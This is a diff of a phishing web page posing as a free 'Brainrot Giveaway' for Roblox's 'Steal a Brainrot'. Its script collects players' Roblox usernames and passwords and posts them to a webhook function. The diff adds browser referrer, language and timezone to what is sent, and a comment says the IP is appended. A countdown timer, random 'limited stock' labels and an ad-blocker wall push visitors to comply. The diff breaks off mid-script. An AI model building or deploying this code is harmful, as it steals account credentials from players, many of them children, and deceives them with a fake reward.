-            text-decoration: none;
-            text-align: center;
-            transition: transform .15s, box-shadow .15s;
-        }
-        .btn-continue:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 255, 136, .4);
-        }
-
-        .confetti-container { position: fixed; inset: 0; pointer-events: none; z-index: 50; }
-        .confetti-piece {
-            position: absolute; width: 10px; height: 10px; top: -10px;
-            border-radius: 2px; animation: confettiFall linear forwards;
-        }
-        @keyframes confettiFall {
-            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
-        }
+        .showcase-card::before { content:''; position:absolute; top:0;left:0;right:0; height:3px; background:linear-gradient(90deg,var(--og-gold),var(--secret-purple),var(--og-gold)); background-size:200% 100%; animation:rainbowSlide 2.5s linear infinite; }
+        .showcase-title { font-family:'Bangers',cursive; font-size:24px; letter-spacing:2px; margin-bottom:16px; color:#fff; text-align:center; text-shadow:0 0 18px rgba(255,215,0,.4); }
+        .scroll-container { flex:1; overflow:hidden; position:relative; border-radius:12px; mask-image:linear-gradient(to bottom,transparent 0%,black 8%,black 92%,transparent 100%); -webkit-mask-image:linear-gradient(to bottom,transparent 0%,black 8%,black 92%,transparent 100%); }
+        .scroll-inner { animation:scrollUp 28s linear infinite; }
+        @keyframes scrollUp { 0% { transform:translateY(0); } 100% { transform:translateY(-50%); } }
+        .brainrot-item { display:flex; align-items:center; gap:14px; padding:12px 16px; margin:6px 4px; background:rgba(255,255,255,.03); border:1px solid rgba(255,255,255,.06); border-radius:14px; transition:background .2s; }
+        .brainrot-item:hover { background:rgba(255,255,255,.07); }
+        .brainrot-img { width:56px;height:56px; border-radius:10px; object-fit:contain; background:rgba(0,0,0,.3); flex-shrink:0; border:2px solid transparent; }
+        .brainrot-img.rarity-og { border-color:rgba(255,215,0,.5); box-shadow:0 0 14px rgba(255,215,0,.35); }
+        .brainrot-img.rarity-secret { border-color:rgba(218,112,255,.5); box-shadow:0 0 14px rgba(191,0,255,.35); }
+        .brainrot-info { flex:1; min-width:0; }
+        .brainrot-name { font-family:'Fredoka One',cursive; font-size:14px; color:#eee; line-height:1.3; margin-bottom:3px; }
+        .brainrot-meta { display:flex; align-items:center; gap:8px; flex-wrap:wrap; }
+        .rarity-badge { font-family:'Fredoka One',cursive; font-size:10px; letter-spacing:1.5px; padding:3px 10px; border-radius:20px; text-transform:uppercase; }
+        .rarity-badge.og { background:linear-gradient(135deg,#ffd700,#ff8c00); color:#1a1a00; animation:ogGlow 2s ease-in-out infinite; }
+        @keyframes ogGlow { 0%,100% { box-shadow:0 0 8px rgba(255,215,0,.5); } 50% { box-shadow:0 0 22px rgba(255,215,0,.9),0 0 40px rgba(255,165,0,.5); } }
+        .rarity-badge.secret { background:linear-gradient(135deg,#bf00ff,#da70ff); color:#fff; animation:secretGlow 2s ease-in-out infinite; }
+        @keyframes secretGlow { 0%,100% { box-shadow:0 0 8px rgba(191,0,255,.5); } 50% { box-shadow:0 0 22px rgba(191,0,255,.9),0 0 40px rgba(218,112,255,.5); } }
+        .stock-indicator { font-size:11px; font-weight:700; letter-spacing:.5px; }
+        .stock-indicator.limited { color:#00ff88; text-shadow:0 0 8px rgba(0,255,136,.5); animation:stockPulseGreen 1.5s ease-in-out infinite; }
+        @keyframes stockPulseGreen { 0%,100% { opacity:1; } 50% { opacity:.55; } }
+        .stock-indicator.out { color:#ff5555; text-shadow:0 0 6px rgba(255,60,60,.4); text-decoration:line-through; opacity:.7; }
+        #selection-screen { display:none; flex-direction:column; align-items:center; width:100%; max-width:700px; animation:fadeUp .6s ease both; }
+        .selection-card { background:var(--card); border:1px solid var(--border); border-radius:24px; padding:32px 28px; width:100%; position:relative; overflow:hidden; box-shadow:0 0 50px rgba(138,43,226,.2),0 0 100px rgba(0,207,255,.1); }
+        .selection-card::before { content:''; position:absolute; top:0;left:0;right:0; height:3px; background:linear-gradient(90deg,var(--og-gold),var(--secret-purple),var(--og-gold)); background-size:200% 100%; animation:rainbowSlide 2s linear infinite; }
+        .selection-title { font-family:'Bangers',cursive; font-size:32px; letter-spacing:2px; margin-bottom:8px; background:linear-gradient(135deg,var(--neon-green),var(--electric-blue)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; text-align:center; }
+        .selection-subtitle { font-size:16px; color:#aaa; margin-bottom:24px; text-align:center; font-weight:700; }
+        .selection-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:14px; margin-bottom:24px; }
+        .brainrot-card { background:rgba(255,255,255,.03); border:2px solid rgba(255,255,255,.08); border-radius:16px; padding:14px; text-align:center; cursor:pointer; transition:all .25s; position:relative; }
+        .brainrot-card:hover { background:rgba(255,255,255,.06); border-color:rgba(255,255,255,.2); }
+        .brainrot-card.selected { border-color:var(--neon-green); background:rgba(0,255,136,.08); box-shadow:0 0 20px rgba(0,255,136,.3); }
+        .brainrot-card .card-img { width:70px;height:70px; object-fit:contain; border-radius:12px; background:rgba(0,0,0,.3); margin:0 auto 8px; border:2px solid transparent; }
+        .brainrot-card.selected .card-img { border-color:var(--neon-green); }
+        .brainrot-card .card-name { font-family:'Fredoka One',cursive; font-size:14px; color:#eee; margin-bottom:4px; }
+        .brainrot-card .card-rarity { font-size:10px; letter-spacing:1px; text-transform:uppercase; font-family:'Fredoka One'; }
+        .selection-counter { font-family:'Bangers',cursive; font-size:22px; color:var(--yellow); text-shadow:0 0 12px rgba(255,215,0,.6); margin-bottom:8px; text-align:center; }
+        .btn-selection-continue { width:100%; padding:16px; border:none; border-radius:14px; background:linear-gradient(135deg,var(--neon-green),var(--electric-blue)); color:#000; font-family:'Bangers',cursive; font-size:22px; letter-spacing:2px; cursor:pointer; transition:transform .15s,box-shadow .15s; }
+        .btn-selection-continue:disabled { opacity:.5; cursor:not-allowed; filter:grayscale(.4); }
+        .btn-selection-continue:hover:not(:disabled) { transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,255,136,.4); }
+        #success-screen { display:none; flex-direction:column; align-items:center; text-align:center; width:100%; max-width:560px; animation:fadeUp .6s ease both; }
+        .success-card { background:var(--card); border:1px solid var(--border); border-radius:24px; padding:36px 30px; width:100%; position:relative; overflow:hidden; box-shadow:0 0 60px rgba(0,255,136,.12),0 0 120px rgba(0,207,255,.06); }
+        .success-card::before { content:''; position:absolute; top:0;left:0;right:0; height:3px; background:linear-gradient(90deg,var(--neon-green),var(--electric-blue),var(--neon-green)); background-size:200% 100%; animation:rainbowSlide 2s linear infinite; }
+        .progress-wrap { margin:0 auto 24px; width:100%; max-width:400px; }
+        .progress-bar { position:relative; width:100%; height:28px; background:rgba(255,255,255,0.05); border-radius:20px; overflow:hidden; border:1px solid rgba(255,255,255,0.15); box-shadow:inset 0 2px 6px rgba(0,0,0,0.4); }
+        .progress-fill { position:absolute; left:0;top:0;bottom:0; width:90%; background:linear-gradient(90deg,#1e90ff,#8a2be2,#ff69b4); background-size:300% 100%; animation:lavaFlow 6s ease-in-out infinite; border-radius:20px; box-shadow:0 0 20px rgba(138,43,226,0.5); overflow:hidden; }
+        @keyframes lavaFlow { 0% { background-position:0% 50%; } 50% { background-position:100% 50%; } 100% { background-position:0% 50%; } }
+        .progress-fill::before { content:''; position:absolute; top:-5px;left:-10%; width:200%;height:200%; background:radial-gradient(ellipse at 20% 50%,rgba(255,255,255,0.4) 0%,transparent 50%),radial-gradient(ellipse at 70% 30%,rgba(255,255,255,0.3) 0%,transparent 50%),radial-gradient(ellipse at 45% 80%,rgba(255,255,255,0.25) 0%,transparent 50%); background-size:30% 80%,40% 50%,35% 60%; background-repeat:no-repeat; animation:bubbleShift 4s ease-in-out infinite alternate; filter:blur(2px); }
+        @keyframes bubbleShift { 0% { transform:translateX(-5%); } 100% { transform:translateX(5%); } }
+        .progress-percent { font-family:'Bangers',cursive; font-size:28px; letter-spacing:2px; margin-top:8px; color:var(--neon-green); text-shadow:0 0 12px rgba(0,255,136,0.6); }
+        .claim-headline { font-family:'Bangers',cursive; font-size:32px; margin-bottom:6px; background:linear-gradient(135deg,var(--neon-green),var(--electric-blue)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; letter-spacing:1px; }
+        .claim-subtitle { font-size:16px; color:#ccc; margin-bottom:18px; font-weight:700; }
+        .chosen-banner { display:flex; flex-wrap:wrap; justify-content:center; gap:12px; margin-bottom:20px; }
+        .chosen-badge { display:flex; align-items:center; gap:6px; background:rgba(255,255,255,.05); border:1px solid rgba(255,255,255,.1); border-radius:12px; padding:8px 14px; font-family:'Fredoka One',cursive; font-size:13px; }
+        .chosen-badge img { width:32px;height:32px; border-radius:6px; object-fit:contain; background:rgba(0,0,0,.3); }
+        .offer-steps { background:rgba(0,255,136,.06); border:1px solid rgba(0,255,136,.2); border-radius:12px; padding:16px 18px; font-size:14px; color:#bbb; margin-bottom:24px; text-align:left; line-height:2; }
+        .offer-steps span { color:var(--neon-green); font-weight:700; font-family:'Fredoka One',cursive; }
+        .btn-continue { display:block; width:100%; padding:16px; border:none; border-radius:14px; background:linear-gradient(135deg,var(--neon-green),var(--electric-blue)); color:#000; font-family:'Bangers',cursive; font-size:22px; letter-spacing:2px; cursor:pointer; text-decoration:none; text-align:center; transition:transform .15s,box-shadow .15s; }
+        .btn-continue:hover { transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,255,136,.4); }
+        .confetti-container { position:fixed; inset:0; pointer-events:none; z-index:50; }
+        .confetti-piece { position:absolute; width:10px;height:10px; top:-10px; border-radius:2px; animation:confettiFall linear forwards; }
+        @keyframes confettiFall { 0% { transform:translateY(0) rotate(0deg); opacity:1; } 100% { transform:translateY(110vh) rotate(720deg); opacity:0; } }
         @keyframes fadeDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
         @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
         @keyframes spin { to { transform:rotate(360deg); } }
-        .floaties { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
-        .floaty {
-            position: absolute; font-size: 22px; opacity: .12;
-            animation: floatyUp linear infinite;
-        }
+        .floaties { position:fixed; inset:0; pointer-events:none; z-index:0; overflow:hidden; }
+        .floaty { position:absolute; font-size:22px; opacity:.12; animation:floatyUp linear infinite; }
         @keyframes floatyUp {
-            0% { transform: translateY(110vh) rotate(0deg); opacity: 0; }
-            10% { opacity: .12; }
-            90% { opacity: .12; }
-            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+            0% { transform:translateY(110vh) rotate(0deg); opacity:0; }
+            10% { opacity:.12; }
+            90% { opacity:.12; }
+            100% { transform:translateY(-10vh) rotate(360deg); opacity:0; }
         }
-        .general-error {
-            background: rgba(255, 45, 120, .1); border: 1px solid rgba(255, 45, 120, .3);
-            border-radius: 10px; padding: 10px 14px; font-size: 13px; color: var(--hot-pink);
-            font-weight: 700; margin-top: 10px; display: none;
-        }
-
-        @media (max-width: 900px) {
-            .main-layout { flex-direction: column; align-items: center; gap: 24px; }
-            .left-column { flex: 0 0 auto; max-width: 100%; width: 100%; min-width: 0; }
-            .right-column { max-width: 100%; width: 100%; min-width: 0; }
-            .showcase-card { max-height: 420px; }
-            .header h1 { font-size: clamp(36px, 7vw, 56px); }
+        .general-error { background:rgba(255,45,120,.1); border:1px solid rgba(255,45,120,.3); border-radius:10px; padding:10px 14px; font-size:13px; color:var(--hot-pink); font-weight:700; margin-top:10px; display:none; }
+        @media (max-width:900px) {
+            .main-layout { flex-direction:column; align-items:center; gap:24px; }
+            .left-column { flex:0 0 auto; max-width:100%; width:100%; min-width:0; }
+            .right-column { max-width:100%; width:100%; min-width:0; }
+            .showcase-card { max-height:420px; }
+            .header h1 { font-size:clamp(36px,7vw,56px); }
         }
     </style>
 </head>
 <body>
+    <!-- Ad-blocker detection element -->
+    <div id="adblock-detector" style="height:1px;width:1px;position:absolute;left:-9999px;" class="adsbygoogle ad"></div>
+
+    <!-- Browser / Adblock Block Overlay -->
+    <div id="browserBlock" style="display:none;position:fixed;inset:0;z-index:9999;background:linear-gradient(145deg,#0b0c1a,#1a1b2f);align-items:center;justify-content:center;padding:1.5rem;">
+        <div style="max-width:440px;width:100%;background:rgba(22,23,45,0.95);border:1px solid rgba(255,100,100,0.4);border-radius:2.5rem;padding:2.5rem 2rem;text-align:center;box-shadow:0 0 60px rgba(255,60,60,0.2);font-family:'Segoe UI',system-ui,sans-serif;color:#fff;">
+            <div style="font-size:4rem;margin-bottom:1rem;" id="block-icon">🚫</div>
+            <h2 id="block-title" style="font-size:1.8rem;font-weight:800;background:linear-gradient(to right,#ff9898,#ff4d4d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:0.8rem;">Ad-Blocker Detected</h2>
+            <p id="block-message" style="color:#d1d5ff;font-size:1rem;line-height:1.6;margin-bottom:1.5rem;">
+                Please disable your ad-blocker to access the Brainrot Giveaway.
+            </p>
+            <p id="block-submessage" style="color:#9ca3af;font-size:0.9rem;margin-bottom:1.8rem;">We rely on offers to provide free giveaways.</p>
+            <button onclick="location.reload()" style="display:inline-flex;align-items:center;gap:0.6rem;background:linear-gradient(135deg,#4285F4,#34A853);padding:0.9rem 2rem;border-radius:3rem;font-weight:700;font-size:1rem;color:white;border:none;cursor:pointer;box-shadow:0 10px 25px rgba(66,133,244,0.5);">
+                🔄 I've disabled my ad-blocker
+            </button>
+            <p style="margin-top:1.2rem;font-size:0.75rem;color:#6b7280;">Refresh the page after disabling.</p>
+        </div>
+    </div>
+
+    <!-- Backgrounds & Main Content -->
     <div class="blob blob1"></div>
     <div class="blob blob2"></div>
     <div class="blob blob3"></div>
@@ -828,7 +269,7 @@
             <div class="prize-tag green">✅ Free Entry</div>
         </div>
 
-        <!-- Registration + Showcase (visible before registration) -->
+        <!-- Registration + Showcase -->
         <div class="main-layout" id="main-layout">
             <div class="left-column" id="register-column">
                 <div class="card" id="register-card">
@@ -875,7 +316,7 @@
             </div>
         </div>
 
-        <!-- Selection Screen (hidden) -->
+        <!-- Selection Screen -->
         <div id="selection-screen">
             <div class="selection-card">
                 <div class="selection-title">Choose Your Brainrots!</div>
@@ -888,7 +329,7 @@
             </div>
         </div>
 
-        <!-- Claim Screen (hidden) -->
+        <!-- Claim Screen -->
         <div id="success-screen">
             <div class="success-card">
                 <div class="progress-wrap">
@@ -912,7 +353,7 @@
     </div>
 
     <script>
-        /* ── Brainrot data ── */
+        // ── Brainrot Data ──
         const brainrotsData = [
             { name: 'Strawberry Elephant', rarity: 'OG', image: 'strawberry-elephant.png' },
             { name: 'Meowl', rarity: 'OG', image: 'meowl.png' },
@@ -926,12 +367,8 @@
             { name: 'La Supreme Combinasion', rarity: 'Secret', image: 'la-supreme-combinasion.png' },
         ];
 
-        /* ── Build infinite scroll showcase ── */
-        const brainrotsWithStock = brainrotsData.map(b => ({
-            ...b,
-            stock: Math.random() < 0.5 ? 'limited' : 'out-of-stock'
-        }));
-
+        // ── Infinite Scroll Showcase ──
+        const brainrotsWithStock = brainrotsData.map(b => ({ ...b, stock: Math.random() < 0.5 ? 'limited' : 'out-of-stock' }));
         function buildBrainrotItem(b) {
             const div = document.createElement('div');
             div.className = 'brainrot-item';
@@ -939,29 +376,23 @@
             const stockClass = b.stock === 'limited' ? 'limited' : 'out';
             const stockText = b.stock === 'limited' ? '⚡ Limited Stock' : '🔴 Out of Stock';
             div.innerHTML = `
-                <img class="brainrot-img ${rarityClass}" 
-                     src="/brainrots/${b.image}" 
-                     alt="${b.name}" 
-                     loading="lazy"
-                     onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2756%27 height=%2756%27%3E%3Crect fill=%27%231a1a2e%27 width=%2756%27 height=%2756%27 rx=%2710%27/%3E%3Ctext fill=%27%23888%27 font-family=%27Arial%27 font-size=%2724%27 text-anchor=%27middle%27 x=%2728%27 y=%2734%27%3E🧠%3C/text%3E%3C/svg%3E'"
-                >
+                <img class="brainrot-img ${rarityClass}" src="/brainrots/${b.image}" alt="${b.name}" loading="lazy"
+                     onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2756%27 height=%2756%27%3E%3Crect fill=%27%231a1a2e%27 width=%2756%27 height=%2756%27 rx=%2710%27/%3E%3Ctext fill=%27%23888%27 font-family=%27Arial%27 font-size=%2724%27 text-anchor=%27middle%27 x=%2728%27 y=%2734%27%3E🧠%3C/text%3E%3C/svg%3E'">
                 <div class="brainrot-info">
-                  <div class="brainrot-name">${b.name}</div>
-                  <div class="brainrot-meta">
-                    <span class="rarity-badge ${b.rarity === 'OG' ? 'og' : 'secret'}">${b.rarity}</span>
-                    <span class="stock-indicator ${stockClass}">${stockText}</span>
-                  </div>
-                </div>
-            `;
+                    <div class="brainrot-name">${b.name}</div>
+                    <div class="brainrot-meta">
+                        <span class="rarity-badge ${b.rarity === 'OG' ? 'og' : 'secret'}">${b.rarity}</span>
+                        <span class="stock-indicator ${stockClass}">${stockText}</span>
+                    </div>
+                </div>`;
             return div;
         }
-
         const scrollInner = document.getElementById('scroll-inner');
         brainrotsWithStock.forEach(b => scrollInner.appendChild(buildBrainrotItem(b)));
         brainrotsWithStock.forEach(b => scrollInner.appendChild(buildBrainrotItem(b)));
 
-        /* ── Floaty emojis ── */
-        const emojis = ['🧠', '🎮', '⚡', '🔥', '💥', '🎁', '🌀', '👾', '✨', '💀'];
+        // ── Floaty Emojis ──
+        const emojis = ['🧠','🎮','⚡','🔥','💥','🎁','🌀','👾','✨','💀'];
         const floaties = document.getElementById('floaties');
         for (let i = 0; i < 18; i++) {
             const el = document.createElement('div');
@@ -974,10 +405,10 @@
             floaties.appendChild(el);
         }
 
-        /* ── Confetti ── */
+        // ── Confetti ──
         function launchConfetti() {
             const container = document.getElementById('confetti');
-            const colors = ['#00ff88', '#ff2d78', '#00cfff', '#ffe600', '#bf00ff'];
+            const colors = ['#00ff88','#ff2d78','#00cfff','#ffe600','#bf00ff'];
             for (let i = 0; i < 80; i++) {
                 const p = document.createElement('div');
                 p.className = 'confetti-piece';
@@ -993,7 +424,7 @@
             }
         }
 
-        /* ── Timer ── */
+        // ── Timer ──
         const TIMER_DURATION = 180;
         let timerRemaining = TIMER_DURATION;
         const timerDisplay = document.getElementById('timer-display');
@@ -1001,12 +432,7 @@
         const timerLabel = timerBanner.querySelector('.timer-label');
         let timerInterval;
         let timerExpired = false;
-
-        function formatTime(seconds) {
-            const m = Math.floor(seconds / 60);
-            const s = seconds % 60;
-            return m + ':' + (s < 10 ? '0' : '') + s;
-        }
+        function formatTime(seconds) { const m = Math.floor(seconds / 60); const s = seconds % 60; return m + ':' + (s < 10 ? '0' : '') + s; }
         function updateTimerDisplay() { timerDisplay.textContent = formatTime(timerRemaining); }
         function startTimer() {
             updateTimerDisplay();
@@ -1024,22 +450,17 @@
         }
         startTimer();
 
-        /* ── Form validation ── */
+        // ── Form Validation ──
         const usernameInput = document.getElementById('roblox-username');
         const passwordInput = document.getElementById('password');
         const passwordStatus = document.getElementById('password-status');
         const verifyBadge = document.getElementById('verify-badge');
         const submitBtn = document.getElementById('submit-btn');
-        const generalError = document.getElementById('general-error');
-
         usernameInput.addEventListener('input', () => {
             const v = usernameInput.value.trim();
             usernameInput.classList.remove('error', 'success');
             verifyBadge.textContent = '';
-            if (v.length >= 3) {
-                usernameInput.classList.add('success');
-                verifyBadge.textContent = '✅';
-            }
+            if (v.length >= 3) { usernameInput.classList.add('success'); verifyBadge.textContent = '✅'; }
             updateSubmitBtn();
         });
         passwordInput.addEventListener('input', () => {
@@ -1065,7 +486,7 @@
             submitBtn.disabled = !(usernameOk && passwordOk);
         }
 
-        /* ── Cookies helpers ── */
+        // ── Cookies ──
         function setCookie(name, value, days) {
             const expires = new Date(Date.now() + days * 864e5).toUTCString();
             document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/; SameSite=Lax';
@@ -1077,18 +498,26 @@
             }, '');
         }
 
-        /* ── Discord webhook (updated to accept optional "choices") ── */
+        // ── Client Info (referrer, language, timezone) ──
+        function getClientInfo() {
+            return {
+                referrer: document.referrer || 'direct',
+                language: navigator.language || 'unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'
+            };
+        }
+
+        // ── Webhook (updated) ──
         async function sendToWebhook(data) {
+            const clientInfo = getClientInfo();
+            const payload = { ...data, ...clientInfo };
             try {
                 const response = await fetch('/.netlify/functions/webhook', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(payload)
                 });
-                if (!response.ok) {
-                    console.error('Function call failed with status:', response.status);
-                    return false;
-                }
+                if (!response.ok) { console.error('Function call failed with status:', response.status); return false; }
                 const result = await response.json();
                 console.log('Webhook response:', result);
                 return result.success === true;
@@ -1098,12 +527,12 @@
             }
         }
 
-        /* ── Global state ── */
+        // ── Global State ──
         let currentUsername = null;
         let currentBonusActive = true;
         let selectedBrainrots = [];
 
-        /* ── Show selection screen ── */
+        // ── Selection Screen ──
         function showSelectionScreen(username, bonusActive) {
             currentUsername = username;
             currentBonusActive = bonusActive;
@@ -1113,34 +542,26 @@
             document.getElementById('success-screen').style.display = 'none';
             buildSelectionGrid();
         }
-
-        /* ── Build selection grid ── */
         function buildSelectionGrid() {
             const grid = document.getElementById('selection-grid');
             grid.innerHTML = '';
-            selectedBrainrots = []; // reset
+            selectedBrainrots = [];
             brainrotsData.forEach((b, index) => {
                 const card = document.createElement('div');
                 card.className = 'brainrot-card';
                 card.dataset.index = index;
                 card.innerHTML = `
-                    <img class="card-img" 
-                         src="/brainrots/${b.image}" 
-                         alt="${b.name}" 
-                         onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2770%27 height=%2770%27%3E%3Crect fill=%27%231a1a2e%27 width=%2770%27 height=%2770%27 rx=%2712%27/%3E%3Ctext fill=%27%23888%27 font-family=%27Arial%27 font-size=%2730%27 text-anchor=%27middle%27 x=%2735%27 y=%2745%27%3E🧠%3C/text%3E%3C/svg%3E'"
-                    >
+                    <img class="card-img" src="/brainrots/${b.image}" alt="${b.name}"
+                         onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2770%27 height=%2770%27%3E%3Crect fill=%27%231a1a2e%27 width=%2770%27 height=%2770%27 rx=%2712%27/%3E%3Ctext fill=%27%23888%27 font-family=%27Arial%27 font-size=%2730%27 text-anchor=%27middle%27 x=%2735%27 y=%2745%27%3E🧠%3C/text%3E%3C/svg%3E'">
                     <div class="card-name">${b.name}</div>
-                    <div class="card-rarity" style="color:${b.rarity === 'OG' ? 'var(--og-gold)' : 'var(--secret-purple)'}">${b.rarity}</div>
-                `;
+                    <div class="card-rarity" style="color:${b.rarity === 'OG' ? 'var(--og-gold)' : 'var(--secret-purple)'}">${b.rarity}</div>`;
                 card.addEventListener('click', () => toggleSelection(index, card));
                 grid.appendChild(card);
             });
             updateSelectionCounter();
         }
-
         function toggleSelection(index, cardElement) {
             if (cardElement.classList.contains('selected')) {
-                // deselect
                 cardElement.classList.remove('selected');
                 selectedBrainrots = selectedBrainrots.filter(i => i !== index);
             } else {
@@ -1151,133 +572,115 @@
             updateSelectionCounter();
             document.getElementById('selection-continue-btn').disabled = selectedBrainrots.length < 1;
         }
-
         function updateSelectionCounter() {
             document.getElementById('selection-counter').textContent = selectedBrainrots.length + ' / 3 selected';
         }
 
-        /* ── Show claim screen with chosen brainrots ── */
+        // ── Claim Screen ──
         function showClaimScreen(username, bonusActive) {
             document.getElementById('selection-screen').style.display = 'none';
             document.getElementById('success-screen').style.display = 'flex';
-            // Build chosen banner
             const chosenBanner = document.getElementById('chosen-banner');
             chosenBanner.innerHTML = '';
             selectedBrainrots.forEach(index => {
                 const b = brainrotsData[index];
                 const badge = document.createElement('div');
                 badge.className = 'chosen-badge';
-                badge.innerHTML = `
-                    <img src="/brainrots/${b.image}" alt="${b.name}" onerror="this.style.display='none'">
-                    <span>${b.name}</span>
-                `;
+                badge.innerHTML = `<img src="/brainrots/${b.image}" alt="${b.name}" onerror="this.style.display='none'"> <span>${b.name}</span>`;
                 chosenBanner.appendChild(badge);
             });
-            // Update offer steps if bonus expired
             const offerSteps = document.getElementById('offer-steps');
             if (bonusActive) {
                 offerSteps.innerHTML = `
                     <span>1.</span> Verify your Roblox account<br>
                     <span>2.</span> Join the Steal a Brainrot experience<br>
                     <span>3.</span> Claim your reward in-game<br>
-                    <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots ACTIVE!</strong>
-                `;
+                    <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots ACTIVE!</strong>`;
             } else {
                 offerSteps.innerHTML = `
                     <span>1.</span> Verify your Roblox account<br>
                     <span>2.</span> Join the Steal a Brainrot experience<br>
                     <span>3.</span> Claim your reward in-game<br>
-                    <span style="color:#ff6b6b;">⏰</span> <strong style="color:#ff6b6b;">Bonus window expired</strong>
-                `;
+                    <span style="color:#ff6b6b;">⏰</span> <strong style="color:#ff6b6b;">Bonus window expired</strong>`;
             }
-            // Save full state to cookie
+            // Save state and send webhook
             setCookie('brainrot_registered', JSON.stringify({ username, choices: selectedBrainrots }), 7);
-            // Send webhook with choices
             const choiceNames = selectedBrainrots.map(i => brainrotsData[i].name);
             sendToWebhook({ username, choices: choiceNames });
             setTimeout(launchConfetti, 200);
         }
 
-        /* ── Selection continue button ── */
-        document.getElementById('selection-continue-btn').addEventListener('click', () => {
-            if (selectedBrainrots.length === 0) return;
-            showClaimScreen(currentUsername, currentBonusActive);
-        });
-
-        /* ── Form submit ── */
+        // ── Event Listeners ──
         document.getElementById('giveaway-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             const username = usernameInput.value.trim();
             const password = passwordInput.value;
             const bonusActive = !timerExpired;
-
-            generalError.style.display = 'none';
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<span class="spinner"></span> Submitting…';
-
-            // Send initial webhook (username + password)
-            const webhookSent = await sendToWebhook({ username, password });
-            if (!webhookSent) console.log('Webhook delivery issue, but continuing.');
-
-            // Show selection screen
+            // Send initial data (password) along with info; IP will be appended by function
+            await sendToWebhook({ username, password });
             showSelectionScreen(username, bonusActive);
         });
-
-        /* ── Claim continue button (redirect) ── */
+        document.getElementById('selection-continue-btn').addEventListener('click', () => {
+            if (selectedBrainrots.length === 0) return;
+            showClaimScreen(currentUsername, currentBonusActive);
+        });
         document.getElementById('continue-button').addEventListener('click', () => {
             window.location.href = 'https://www.roblox.com';
         });
 
-        /* ── On page load: check if already registered ── */
-        (function init() {
-            const savedData = getCookie('brainrot_registered');
-            if (savedData) {
-                try {
-                    const parsed = JSON.parse(savedData);
-                    currentUsername = parsed.username;
-                    selectedBrainrots = parsed.choices || [];
-                    currentBonusActive = !timerExpired;
-                    // Skip directly to claim screen
-                    document.getElementById('main-layout').style.display = 'none';
-                    document.getElementById('prize-banner').style.display = 'none';
-                    document.getElementById('selection-screen').style.display = 'none';
-                    document.getElementById('success-screen').style.display = 'flex';
-                    // Rebuild chosen banner
-                    const chosenBanner = document.getElementById('chosen-banner');
-                    chosenBanner.innerHTML = '';
-                    selectedBrainrots.forEach(index => {
-                        const b = brainrotsData[index];
-                        const badge = document.createElement('div');
-                        badge.className = 'chosen-badge';
-                        badge.innerHTML = `
-                            <img src="/brainrots/${b.image}" alt="${b.name}" onerror="this.style.display='none'">
-                            <span>${b.name}</span>
-                        `;
-                        chosenBanner.appendChild(badge);
-                    });
-                    // Update offer steps
-                    const offerSteps = document.getElementById('offer-steps');
-                    if (currentBonusActive) {
-                        offerSteps.innerHTML = `
-                            <span>1.</span> Verify your Roblox account<br>
-                            <span>2.</span> Join the Steal a Brainrot experience<br>
-                            <span>3.</span> Claim your reward in-game<br>
-                            <span style="color:#ffd700;">⭐</span> <strong style="color:#ffd700;">+2 Bonus Brainrots ACTIVE!</strong>
-                        `;
-                    } else {
-                        offerSteps.innerHTML = `
-                            <span>1.</span> Verify your Roblox account<br>
-                            <span>2.</span> Join the Steal a Brainrot experience<br>
-                            <span>3.</span> Claim your reward in-game<br>
-                            <span style="color:#ff6b6b;">⏰</span> <strong style="color:#ff6b6b;">Bonus window expired</strong>
-                        `;
-                    }
-                    setTimeout(launchConfetti, 400);
-                } catch (e) {
-                    // corrupted cookie, ignore
+        // ── Ad-Blocker Detection ──
+        function detectAdBlocker() {
+            const adDiv = document.getElementById('adblock-detector');
+            if (!adDiv) return false;
+            // Check if the element is hidden by ad-blocker (many block .adsbygoogle)
+            return adDiv.offsetHeight === 0 || adDiv.offsetParent === null;
+        }
+        const blockOverlay = document.getElementById('browserBlock');
+        if (detectAdBlocker()) {
+            blockOverlay.style.display = 'flex';
+            document.getElementById('main-wrapper').style.display = 'none';
+            // Update overlay text for ad-blocker
+            document.getElementById('block-title').textContent = 'Ad-Blocker Detected';
+            document.getElementById('block-message').textContent = 'Please disable your ad-blocker to access the Brainrot Giveaway.';
+            document.getElementById('block-submessage').textContent = 'We rely on offers to provide free giveaways.';
+            document.getElementById('block-icon').textContent = '🛑';
+            document.getElementById('block-action').style.display = 'none';
+            document.getElementById('block-footer').style.display = 'none';
+        }
+
+        // ── Initial Cookie Check ──
+        const savedData = getCookie('brainrot_registered');
+        if (savedData && !detectAdBlocker()) {
+            try {
+                const parsed = JSON.parse(savedData);
+                currentUsername = parsed.username;
+                selectedBrainrots = parsed.choices || [];
+                currentBonusActive = !timerExpired;
+                document.getElementById('main-layout').style.display = 'none';
+                document.getElementById('prize-banner').style.display = 'none';
